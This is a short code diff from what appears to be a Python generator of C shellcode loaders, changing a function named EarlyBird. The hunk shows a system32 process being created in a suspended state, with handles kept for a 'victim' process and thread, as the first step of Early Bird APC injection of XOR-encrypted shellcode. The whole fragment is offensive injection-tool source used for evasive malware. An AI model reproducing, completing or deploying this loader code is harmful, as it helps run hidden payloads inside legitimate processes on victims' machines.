@@ -18,7 +18,7 @@ def EarlyBird(shellcode_var,ciphertext_split,process_to_inject,time,xor_func,key
                 STARTUPINFOA si = {{ 0 }};
                 PROCESS_INFORMATION pi = {{ 0 }};
 
-                CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+                CreateProcessA("C:\\\\Windows\\\\system32\\\\{process_to_inject}", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
                 HANDLE victimProcess = pi.hProcess;
                 HANDLE threadHandle = pi.hThread;
                 //delay execution
